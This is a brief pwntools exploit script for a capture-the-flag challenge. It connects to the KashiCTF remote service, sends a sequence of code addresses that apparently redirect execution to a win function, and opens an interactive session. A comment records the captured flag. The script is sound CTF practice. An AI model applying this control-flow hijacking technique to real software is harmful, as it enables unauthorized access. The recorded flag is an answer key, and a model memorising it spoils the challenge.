from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chall')

p = remote('kashictf.iitbhucybersec.in', 21857)

p.sendline(b'0x40126e')
p.sendline(b'0x40126e')
p.sendline(b'0x40126e')
p.sendline(b'0x40126e')
p.sendline(b'0x40126e')
p.sendline(b'0x4011ba')

p.interactive()

# KashiCTF{m4r10_15_fun_w17H_C_d9daTrwD}
